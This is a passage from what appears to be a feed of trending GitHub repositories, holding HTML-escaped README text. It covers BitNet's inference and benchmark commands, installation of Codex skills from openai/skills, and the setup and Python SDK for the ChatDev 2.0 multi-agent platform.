usage: setup_env.py [-h] [--hf-repo {1bitLLM/bitnet_b1_58-large,1bitLLM/bitnet_b1_58-3B,HF1BitLLM/Llama3-8B-1.58-100B-tokens,tiiuae/Falcon3-1B-Instruct-1.58bit,tiiuae/Falcon3-3B-Instruct-1.58bit,tiiuae/Falcon3-7B-Instruct-1.58bit,tiiuae/Falcon3-10B-Instruct-1.58bit}] [--model-dir MODEL_DIR] [--log-dir LOG_DIR] [--quant-type {i2_s,tl1}] [--quant-embd]
                    [--use-pretuned]

Setup the environment for running inference

optional arguments:
  -h, --help            show this help message and exit
  --hf-repo {1bitLLM/bitnet_b1_58-large,1bitLLM/bitnet_b1_58-3B,HF1BitLLM/Llama3-8B-1.58-100B-tokens,tiiuae/Falcon3-1B-Instruct-1.58bit,tiiuae/Falcon3-3B-Instruct-1.58bit,tiiuae/Falcon3-7B-Instruct-1.58bit,tiiuae/Falcon3-10B-Instruct-1.58bit}, -hr {1bitLLM/bitnet_b1_58-large,1bitLLM/bitnet_b1_58-3B,HF1BitLLM/Llama3-8B-1.58-100B-tokens,tiiuae/Falcon3-1B-Instruct-1.58bit,tiiuae/Falcon3-3B-Instruct-1.58bit,tiiuae/Falcon3-7B-Instruct-1.58bit,tiiuae/Falcon3-10B-Instruct-1.58bit}
                        Model used for inference
  --model-dir MODEL_DIR, -md MODEL_DIR
                        Directory to save/load the model
  --log-dir LOG_DIR, -ld LOG_DIR
                        Directory to save the logging info
  --quant-type {i2_s,tl1}, -q {i2_s,tl1}
                        Quantization type
  --quant-embd          Quantize the embeddings to f16
  --use-pretuned, -p    Use the pretuned kernel parameters
&lt;/pre&gt; 
&lt;h2&gt;Usage&lt;/h2&gt; 
&lt;h3&gt;Basic usage&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Run inference with the quantized model
python run_inference.py -m models/BitNet-b1.58-2B-4T/ggml-model-i2_s.gguf -p "You are a helpful assistant" -cnv
&lt;/code&gt;&lt;/pre&gt; 
&lt;pre&gt;
usage: run_inference.py [-h] [-m MODEL] [-n N_PREDICT] -p PROMPT [-t THREADS] [-c CTX_SIZE] [-temp TEMPERATURE] [-cnv]

Run inference

optional arguments:
  -h, --help            show this help message and exit
  -m MODEL, --model MODEL
                        Path to model file
  -n N_PREDICT, --n-predict N_PREDICT
                        Number of tokens to predict when generating text
  -p PROMPT, --prompt PROMPT
                        Prompt to generate text from
  -t THREADS, --threads THREADS
                        Number of threads to use
  -c CTX_SIZE, --ctx-size CTX_SIZE
                        Size of the prompt context
  -temp TEMPERATURE, --temperature TEMPERATURE
                        Temperature, a hyperparameter that controls the randomness of the generated text
  -cnv, --conversation  Whether to enable chat mode or not (for instruct models.)
                        (When this option is turned on, the prompt specified by -p will be used as the system prompt.)
&lt;/pre&gt; 
&lt;h3&gt;Benchmark&lt;/h3&gt; 
&lt;p&gt;We provide scripts to run the inference benchmark providing a model.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;usage: e2e_benchmark.py -m MODEL [-n N_TOKEN] [-p N_PROMPT] [-t THREADS]  
   
Setup the environment for running the inference  
   
required arguments:  
  -m MODEL, --model MODEL  
                        Path to the model file. 
   
optional arguments:  
  -h, --help  
                        Show this help message and exit. 
  -n N_TOKEN, --n-token N_TOKEN  
                        Number of generated tokens. 
  -p N_PROMPT, --n-prompt N_PROMPT  
                        Prompt to generate text from. 
  -t THREADS, --threads THREADS  
                        Number of threads to use. 
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Here's a brief explanation of each argument:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;-m&lt;/code&gt;, &lt;code&gt;--model&lt;/code&gt;: The path to the model file. This is a required argument that must be provided when running the script.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;-n&lt;/code&gt;, &lt;code&gt;--n-token&lt;/code&gt;: The number of tokens to generate during the inference. It is an optional argument with a default value of 128.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;-p&lt;/code&gt;, &lt;code&gt;--n-prompt&lt;/code&gt;: The number of prompt tokens to use for generating text. This is an optional argument with a default value of 512.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;-t&lt;/code&gt;, &lt;code&gt;--threads&lt;/code&gt;: The number of threads to use for running the inference. It is an optional argument with a default value of 2.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;-h&lt;/code&gt;, &lt;code&gt;--help&lt;/code&gt;: Show the help message and exit. Use this argument to display usage information.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;For example:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-sh"&gt;python utils/e2e_benchmark.py -m /path/to/model -n 200 -p 256 -t 4  
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This command would run the inference benchmark using the model located at &lt;code&gt;/path/to/model&lt;/code&gt;, generating 200 tokens from a 256 token prompt, utilizing 4 threads.&lt;/p&gt; 
&lt;p&gt;For the model layout that do not supported by any public model, we provide scripts to generate a dummy model with the given model layout, and run the benchmark on your machine:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;python utils/generate-dummy-bitnet-model.py models/bitnet_b1_58-large --outfile models/dummy-bitnet-125m.tl1.gguf --outtype tl1 --model-size 125M

# Run benchmark with the generated model, use -m to specify the model path, -p to specify the prompt processed, -n to specify the number of token to generate
python utils/e2e_benchmark.py -m models/dummy-bitnet-125m.tl1.gguf -p 512 -n 128
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Convert from &lt;code&gt;.safetensors&lt;/code&gt; Checkpoints&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-sh"&gt;# Prepare the .safetensors model file
huggingface-cli download microsoft/bitnet-b1.58-2B-4T-bf16 --local-dir ./models/bitnet-b1.58-2B-4T-bf16

# Convert to gguf model
python ./utils/convert-helper-bitnet.py ./models/bitnet-b1.58-2B-4T-bf16
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;FAQ (Frequently Asked Questions)üìå&lt;/h3&gt; 
&lt;h4&gt;Q1: The build dies with errors building llama.cpp due to issues with std::chrono in log.cpp?&lt;/h4&gt; 
&lt;p&gt;&lt;strong&gt;A:&lt;/strong&gt; This is an issue introduced in recent version of llama.cpp. Please refer to this &lt;a href="https://github.com/tinglou/llama.cpp/commit/4e3db1e3d78cc1bcd22bcb3af54bd2a4628dd323"&gt;commit&lt;/a&gt; in the &lt;a href="https://github.com/abetlen/llama-cpp-python/issues/1942"&gt;discussion&lt;/a&gt; to fix this issue.&lt;/p&gt; 
&lt;h4&gt;Q2: How to build with clang in conda environment on windows?&lt;/h4&gt; 
&lt;p&gt;&lt;strong&gt;A:&lt;/strong&gt; Before building the project, verify your clang installation and access to Visual Studio tools by running:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;clang -v
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This command checks that you are using the correct version of clang and that the Visual Studio tools are available. If you see an error message such as:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;'clang' is not recognized as an internal or external command, operable program or batch file.
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;It indicates that your command line window is not properly initialized for Visual Studio tools.&lt;/p&gt; 
&lt;p&gt;‚Ä¢ If you are using Command Prompt, run:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;"C:\Program Files\Microsoft Visual Studio\2022\Professional\Common7\Tools\VsDevCmd.bat" -startdir=none -arch=x64 -host_arch=x64
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;‚Ä¢ If you are using Windows PowerShell, run the following commands:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;Import-Module "C:\Program Files\Microsoft Visual Studio\2022\Professional\Common7\Tools\Microsoft.VisualStudio.DevShell.dll" Enter-VsDevShell 3f0e31ad -SkipAutomaticLocation -DevCmdArguments "-arch=x64 -host_arch=x64"
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;These steps will initialize your environment and allow you to use the correct Visual Studio tools.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>openai/skills</title>
      <link>https://github.com/openai/skills</link>
      <description>&lt;p&gt;Skills Catalog for Codex&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Agent Skills&lt;/h1&gt; 
&lt;p&gt;Agent Skills are folders of instructions, scripts, and resources that AI agents can discover and use to perform at specific tasks. Write once, use everywhere.&lt;/p&gt; 
&lt;p&gt;Codex uses skills to help package capabilities that teams and individuals can use to complete specific tasks in a repeatable way. This repository catalogs skills for use and distribution with Codex.&lt;/p&gt; 
&lt;p&gt;Learn more:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://developers.openai.com/codex/skills"&gt;Using skills in Codex&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://developers.openai.com/codex/skills/create-skill"&gt;Create custom skills in Codex&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://agentskills.io"&gt;Agent Skills open standard&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Installing a skill&lt;/h2&gt; 
&lt;p&gt;Skills in &lt;a href="https://raw.githubusercontent.com/openai/skills/main/skills/.system/"&gt;&lt;code&gt;.system&lt;/code&gt;&lt;/a&gt; are automatically installed in the latest version of Codex.&lt;/p&gt; 
&lt;p&gt;To install &lt;a href="https://raw.githubusercontent.com/openai/skills/main/skills/.curated/"&gt;curated&lt;/a&gt; or &lt;a href="https://raw.githubusercontent.com/openai/skills/main/skills/.experimental/"&gt;experimental&lt;/a&gt; skills, you can use the &lt;code&gt;$skill-installer&lt;/code&gt; inside Codex.&lt;/p&gt; 
&lt;p&gt;Curated skills can be installed by name (defaults to &lt;code&gt;skills/.curated&lt;/code&gt;):&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;$skill-installer gh-address-comments
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For experimental skills, specify the skill folder. For example:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;$skill-installer install the create-plan skill from the .experimental folder
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Or provide the GitHub directory URL:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;$skill-installer install https://github.com/openai/skills/tree/main/skills/.experimental/create-plan
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;After installing a skill, restart Codex to pick up new skills.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;The license of an individual skill can be found directly inside the skill's directory inside the &lt;code&gt;LICENSE.txt&lt;/code&gt; file.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>OpenBMB/ChatDev</title>
      <link>https://github.com/OpenBMB/ChatDev</link>
      <description>&lt;p&gt;ChatDev 2.0: Dev All through LLM-powered Multi-Agent Collaboration&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;ChatDev 2.0 - DevAll&lt;/h1&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/frontend/public/media/logo.png" alt="DevAll Logo" width="500" /&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;strong&gt;A Zero-Code Multi-Agent Platform for Developing Everything&lt;/strong&gt; &lt;/p&gt; 
&lt;p align="center"&gt; „Äê&lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/README.md"&gt;English&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/README-zh.md"&gt;ÁÆÄ‰Ωì‰∏≠Êñá&lt;/a&gt;„Äë &lt;/p&gt; 
&lt;p align="center"&gt; „Äêüìö &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/#developers"&gt;Developers&lt;/a&gt; | üë• &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/#primary-contributors"&gt;Contributors&lt;/a&gt;ÔΩú‚≠êÔ∏è &lt;a href="https://github.com/OpenBMB/ChatDev/tree/chatdev1.0"&gt;ChatDev 1.0 (Legacy)&lt;/a&gt;„Äë &lt;/p&gt; 
&lt;h2&gt;üìñ Overview&lt;/h2&gt; 
&lt;p&gt;ChatDev has evolved from a specialized software development multi-agent system into a comprehensive multi-agent orchestration platform.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/OpenBMB/ChatDev/tree/main"&gt;&lt;strong&gt;ChatDev 2.0 (DevAll)&lt;/strong&gt;&lt;/a&gt; is a &lt;strong&gt;Zero-Code Multi-Agent Platform&lt;/strong&gt; for "Developing Everything". It empowers users to rapidly build and execute customized multi-agent systems through simple configuration. No coding is required‚Äîusers can define agents, workflows, and tasks to orchestrate complex scenarios such as data visualization, 3D generation, and deep research.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/OpenBMB/ChatDev/tree/chatdev1.0"&gt;&lt;strong&gt;ChatDev 1.0 (Legacy)&lt;/strong&gt;&lt;/a&gt; operates as a &lt;strong&gt;Virtual Software Company&lt;/strong&gt;. It utilizes various intelligent agents (e.g., CEO, CTO, Programmer) participating in specialized functional seminars to automate the entire software development life cycle‚Äîincluding designing, coding, testing, and documenting. It serves as the foundational paradigm for communicative agent collaboration.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;üéâ News&lt;/h2&gt; 
&lt;p&gt;‚Ä¢ &lt;strong&gt;Jan 07, 2026: üöÄ We are excited to announce the official release of ChatDev 2.0 (DevAll)!&lt;/strong&gt; This version introduces a zero-code multi-agent orchestration platform. The classic ChatDev (v1.x) has been moved to the &lt;a href="https://github.com/OpenBMB/ChatDev/tree/chatdev1.0"&gt;&lt;code&gt;chatdev1.0&lt;/code&gt;&lt;/a&gt; branch for maintenance. More details about ChatDev 2.0 can be found on &lt;a href="https://x.com/OpenBMB/status/2008916790399701335"&gt;our official post&lt;/a&gt;.&lt;/p&gt; 
&lt;details&gt; 
 &lt;summary&gt;Old News&lt;/summary&gt; 
 &lt;p&gt;‚Ä¢Sep 24, 2025: üéâ Our paper &lt;a href="https://arxiv.org/abs/2505.19591"&gt;Multi-Agent Collaboration via Evolving Orchestration&lt;/a&gt; has been accepted to NeurIPS 2025. The implementation is available in the &lt;code&gt;puppeteer&lt;/code&gt; branch of this repository.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢May 26, 2025: üéâ We propose a novel puppeteer-style paradigm for multi-agent collaboration among large language model based agents. By leveraging a learnable central orchestrator optimized with reinforcement learning, our method dynamically activates and sequences agents to construct efficient, context-aware reasoning paths. This approach not only improves reasoning quality but also reduces computational costs, enabling scalable and adaptable multi-agent cooperation in complex tasks. See our paper in &lt;a href="https://arxiv.org/abs/2505.19591"&gt;Multi-Agent Collaboration via Evolving Orchestration&lt;/a&gt;.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/puppeteer.png" width="800" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢June 25, 2024: üéâTo foster development in LLM-powered multi-agent collaborationü§ñü§ñ and related fields, the ChatDev team has curated a collection of seminal papersüìÑ presented in a &lt;a href="https://github.com/OpenBMB/ChatDev/tree/main/MultiAgentEbook"&gt;open-source&lt;/a&gt; interactive e-booküìö format. Now you can explore the latest advancements on the &lt;a href="https://thinkwee.top/multiagent_ebook"&gt;Ebook Website&lt;/a&gt; and download the &lt;a href="https://github.com/OpenBMB/ChatDev/raw/main/MultiAgentEbook/papers.csv"&gt;paper list&lt;/a&gt;.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/ebook.png" width="800" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢June 12, 2024: We introduced Multi-Agent Collaboration Networks (MacNet) üéâ, which utilize directed acyclic graphs to facilitate effective task-oriented collaboration among agents through linguistic interactions ü§ñü§ñ. MacNet supports co-operation across various topologies and among more than a thousand agents without exceeding context limits. More versatile and scalable, MacNet can be considered as a more advanced version of ChatDev's chain-shaped topology. Our preprint paper is available at &lt;a href="https://arxiv.org/abs/2406.07155"&gt;https://arxiv.org/abs/2406.07155&lt;/a&gt;. This technique has been incorporated into the &lt;a href="https://github.com/OpenBMB/ChatDev/tree/macnet"&gt;macnet&lt;/a&gt; branch, enhancing support for diverse organizational structures and offering richer solutions beyond software development (e.g., logical reasoning, data analysis, story generation, and more).&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/macnet.png" width="500" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ May 07, 2024, we introduced "Iterative Experience Refinement" (IER), a novel method where instructor and assistant agents enhance shortcut-oriented experiences to efficiently adapt to new tasks. This approach encompasses experience acquisition, utilization, propagation and elimination across a series of tasks and making the pricess shorter and efficient. Our preprint paper is available at &lt;a href="https://arxiv.org/abs/2405.04219"&gt;https://arxiv.org/abs/2405.04219&lt;/a&gt;, and this technique will soon be incorporated into ChatDev.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/ier.png" width="220" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ January 25, 2024: We have integrated Experiential Co-Learning Module into ChatDev. Please see the &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/wiki.md#co-tracking"&gt;Experiential Co-Learning Guide&lt;/a&gt;.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ December 28, 2023: We present Experiential Co-Learning, an innovative approach where instructor and assistant agents accumulate shortcut-oriented experiences to effectively solve new tasks, reducing repetitive errors and enhancing efficiency. Check out our preprint paper at &lt;a href="https://arxiv.org/abs/2312.17025"&gt;https://arxiv.org/abs/2312.17025&lt;/a&gt; and this technique will soon be integrated into ChatDev.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/ecl.png" width="860" /&gt; &lt;/p&gt; ‚Ä¢ November 15, 2023: We launched ChatDev as a SaaS platform that enables software developers and innovative entrepreneurs to build software efficiently at a very low cost and remove the barrier to entry. Try it out at https://chatdev.modelbest.cn/. 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/saas.png" width="560" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ November 2, 2023: ChatDev is now supported with a new feature: incremental development, which allows agents to develop upon existing codes. Try &lt;code&gt;--config "incremental" --path "[source_code_directory_path]"&lt;/code&gt; to start it.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/increment.png" width="700" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ October 26, 2023: ChatDev is now supported with Docker for safe execution (thanks to contribution from &lt;a href="https://github.com/ManindraDeMel"&gt;ManindraDeMel&lt;/a&gt;). Please see &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/wiki.md#docker-start"&gt;Docker Start Guide&lt;/a&gt;.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/docker.png" width="400" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ September 25, 2023: The &lt;strong&gt;Git&lt;/strong&gt; mode is now available, enabling the programmer &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/visualizer/static/figures/programmer.png" height="20" /&gt; to utilize Git for version control. To enable this feature, simply set &lt;code&gt;"git_management"&lt;/code&gt; to &lt;code&gt;"True"&lt;/code&gt; in &lt;code&gt;ChatChainConfig.json&lt;/code&gt;. See &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/wiki.md#git-mode"&gt;guide&lt;/a&gt;.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/github.png" width="600" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ September 20, 2023: The &lt;strong&gt;Human-Agent-Interaction&lt;/strong&gt; mode is now available! You can get involved with the ChatDev team by playing the role of reviewer &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/visualizer/static/figures/reviewer.png" height="20" /&gt; and making suggestions to the programmer &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/visualizer/static/figures/programmer.png" height="20" /&gt;; try &lt;code&gt;python3 run.py --task [description_of_your_idea] --config "Human"&lt;/code&gt;. See &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/wiki.md#human-agent-interaction"&gt;guide&lt;/a&gt; and &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/WareHouse/Gomoku_HumanAgentInteraction_20230920135038"&gt;example&lt;/a&gt;.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/Human_intro.png" width="600" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ September 1, 2023: The &lt;strong&gt;Art&lt;/strong&gt; mode is available now! You can activate the designer agent &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/visualizer/static/figures/designer.png" height="20" /&gt; to generate images used in the software; try &lt;code&gt;python3 run.py --task [description_of_your_idea] --config "Art"&lt;/code&gt;. See &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/wiki.md#art"&gt;guide&lt;/a&gt; and &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/WareHouse/gomokugameArtExample_THUNLP_20230831122822"&gt;example&lt;/a&gt;.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ August 28, 2023: The system is publicly available.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ August 17, 2023: The v1.0.0 version was ready for release.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ July 30, 2023: Users can customize ChatChain, Phasea and Role settings. Additionally, both online Log mode and replay mode are now supported.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ July 16, 2023: The &lt;a href="https://arxiv.org/abs/2307.07924"&gt;preprint paper&lt;/a&gt; associated with this project was published.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ June 30, 2023: The initial version of the ChatDev repository was released.&lt;/p&gt; 
&lt;/details&gt; 
&lt;h2&gt;üöÄ Quick Start&lt;/h2&gt; 
&lt;h3&gt;üìã Prerequisites&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;OS&lt;/strong&gt;: macOS / Linux / WSL / Windows&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Python&lt;/strong&gt;: 3.12+&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Node.js&lt;/strong&gt;: 18+&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Package Manager&lt;/strong&gt;: &lt;a href="https://docs.astral.sh/uv/"&gt;uv&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üì¶ Installation&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Backend Dependencies&lt;/strong&gt; (Python managed by &lt;code&gt;uv&lt;/code&gt;):&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;uv sync
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Frontend Dependencies&lt;/strong&gt; (Vite + Vue 3):&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;cd frontend &amp;amp;&amp;amp; npm install
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;‚ö°Ô∏è Run the Application&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Start Backend&lt;/strong&gt; :&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;# Run from the project root
uv run python server_main.py --port 6400 --reload
&lt;/code&gt;&lt;/pre&gt; 
  &lt;blockquote&gt; 
   &lt;p&gt;Remove &lt;code&gt;--reload&lt;/code&gt; if output files (e.g., GameDev) trigger restarts, which interrupts tasks and loses progress.&lt;/p&gt; 
  &lt;/blockquote&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Start Frontend&lt;/strong&gt;:&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;cd frontend
VITE_API_BASE_URL=http://localhost:6400 npm run dev
&lt;/code&gt;&lt;/pre&gt; 
  &lt;blockquote&gt; 
   &lt;p&gt;Then access the Web Console at &lt;strong&gt;&lt;a href="http://localhost:5173"&gt;http://localhost:5173&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt; 
  &lt;/blockquote&gt; 
  &lt;blockquote&gt; 
   &lt;p&gt;&lt;strong&gt;üí° Tip&lt;/strong&gt;: If the frontend fails to connect to the backend, the default port &lt;code&gt;6400&lt;/code&gt; may already be occupied. Please switch both services to an available port, for example:&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;&lt;strong&gt;Backend&lt;/strong&gt;: start with &lt;code&gt;--port 6401&lt;/code&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;strong&gt;Frontend&lt;/strong&gt;: set &lt;code&gt;VITE_API_BASE_URL=http://localhost:6401&lt;/code&gt;&lt;/li&gt; 
   &lt;/ul&gt; 
  &lt;/blockquote&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;üîë Configuration&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Environment Variables&lt;/strong&gt;: Create a &lt;code&gt;.env&lt;/code&gt; file in the project root.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Model Keys&lt;/strong&gt;: Set &lt;code&gt;API_KEY&lt;/code&gt; and &lt;code&gt;BASE_URL&lt;/code&gt; in &lt;code&gt;.env&lt;/code&gt; for your LLM provider.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;YAML placeholders&lt;/strong&gt;: Use &lt;code&gt;${VAR}&lt;/code&gt;Ôºàe.g., &lt;code&gt;${API_KEY}&lt;/code&gt;Ôºâin configuration files to reference these variables.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üí° How to Use&lt;/h2&gt; 
&lt;h3&gt;üñ•Ô∏è Web Console&lt;/h3&gt; 
&lt;p&gt;The DevAll interface provides a seamless experience for both construction and execution&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Tutorial&lt;/strong&gt;: Comprehensive step-by-step guides and documentation integrated directly into the platform to help you get started quickly.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/tutorial-en.png" /&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Workflow&lt;/strong&gt;: A visual canvas to design your multi-agent systems. Configure node parameters, define context flows, and orchestrate complex agent interactions with drag-and-drop ease.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/workflow.gif" /&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Launch&lt;/strong&gt;: Initiate workflows, monitor real-time logs, inspect intermediate artifacts, and provide human-in-the-loop feedback.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/launch.gif" /&gt; 
&lt;h3&gt;üß∞ Python SDK&lt;/h3&gt; 
&lt;p&gt;For automation and batch processing, use our lightweight Python SDK to execute workflows programmatically and retrieve results directly.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;from runtime.sdk import run_workflow

# Execute a workflow and get the final node message
result = run_workflow(
    yaml_file="yaml_instance/demo.yaml",
    task_prompt="Summarize the attached document in one sentence.",
    attachments=["/path/to/document.pdf"],
    variables={"API_KEY": "sk-xxxx"} # Override .env variables if needed
)

if result.final_message:
    print(f"Output: {result.final_message.text_content()}")
&lt;/code&gt;&lt;/pre&gt; 
&lt;hr /&gt; 
&lt;p&gt;&lt;a id="developers"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;‚öôÔ∏è For Developers&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;For secondary development and extensions, please proceed with this section.&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Extend DevAll with new nodes, providers, and tools. The project is organized into a modular structure:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Core Systems&lt;/strong&gt;: &lt;code&gt;server/&lt;/code&gt; hosts the FastAPI backend, while &lt;code&gt;runtime/&lt;/code&gt; manages agent abstraction and tool execution.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Orchestration&lt;/strong&gt;: &lt;code&gt;workflow/&lt;/code&gt; handles the multi-agent logic, driven by configurations in &lt;code&gt;entity/&lt;/code&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Frontend&lt;/strong&gt;: &lt;code&gt;frontend/&lt;/code&gt; contains the Vue 3 Web Console.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Extensibility&lt;/strong&gt;: &lt;code&gt;functions/&lt;/code&gt; is the place for custom Python tools.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Relevant reference documentation:&lt;/p&gt; 
&lt;ul&gt; 
